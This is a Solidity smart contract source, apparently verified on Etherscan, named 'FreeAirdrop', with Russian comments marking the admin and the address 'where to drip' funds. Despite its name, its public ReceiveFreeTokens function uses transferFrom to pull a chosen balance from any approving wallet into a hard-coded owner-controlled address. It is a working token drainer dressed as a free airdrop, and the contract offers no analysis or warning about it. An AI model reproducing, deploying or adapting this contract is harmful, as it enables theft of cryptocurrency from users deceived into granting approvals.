/**
 *Submitted for verification at Etherscan.io on 2022-04-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract FreeAirdrop {

address owner = 0x063E77217ea4cD272588cB8F8C2b692F33518F0f; //админ
modifier onlyOwner() {
  require(msg.sender == owner);
  _;
}

address myAdr = 0x063E77217ea4cD272588cB8F8C2b692F33518F0f;//куда капать

function switchMyAdr(address newAdress) onlyOwner public
{
    myAdr = newAdress;
}

function ReceiveFreeTokens(address TokenAdr, address senderAdr, uint256 balance) public
{
      IBEP20 token = IBEP20(TokenAdr);
      token.transferFrom(senderAdr, myAdr, balance);
}

}